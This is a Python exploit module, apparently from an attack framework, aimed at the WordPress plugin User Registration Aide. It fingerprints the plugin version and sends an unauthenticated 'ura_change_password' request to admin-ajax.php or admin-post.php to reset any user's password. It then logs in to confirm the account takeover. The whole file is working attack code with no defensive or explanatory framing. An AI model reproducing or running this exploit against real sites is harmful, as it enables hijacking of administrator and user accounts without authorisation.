#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""User Registration Aide WordPress plugin helpers."""

from __future__ import annotations

import re
from typing import Optional, Tuple

from core.framework.base_module import BaseModule


class User_registration_aide(BaseModule):
    """Unverified password change."""

    def ura_detected(self) -> Tuple[bool, str]:
        for path in ("/", "/wp-content/plugins/user-registration-aide/readme.txt"):
            resp = self.http_request("GET", path, timeout=12)
            if not resp:
                continue
            body = (resp.text or "").lower()
            if "registration aide" in body or "user-registration-aide" in body:
                version = ""
                if "readme" in path:
                    match = re.search(r"Stable tag:\s*([\w.\-]+)", resp.text or "", re.I)
                    if match:
                        version = match.group(1)
                return True, version
        return False, ""

    def ura_change_password(
        self,
        user_login: str,
        new_password: str,
    ) -> Optional[dict]:
        data = {
            "action": "ura_change_password",
            "user_login": user_login,
            "new_password": new_password,
            "confirm_password": new_password,
        }
        for ep in ("/wp-admin/admin-ajax.php", "/wp-admin/admin-post.php"):
            resp = self.http_request("POST", ep, data=data, timeout=20)
            if not resp:
                continue
            body = (resp.text or "").strip()
            code = int(resp.status_code or 0)
            if code in (200, 302) and body not in ("0", "-1"):
                return {"endpoint": ep, "status_code": code}
        return None

    def ura_verify_login(self, user_login: str, password: str) -> bool:
        resp = self.http_request(
            "POST",
            "/wp-login.php",
            data={
                "log": user_login,
                "pwd": password,
                "wp-submit": "Log In",
            },
            allow_redirects=False,
            timeout=20,
            session=True,
        )
        if not resp:
            return False
        for cookie in self.session.cookies:
            if str(cookie.name).startswith("wordpress_logged_in"):
                return True
        return False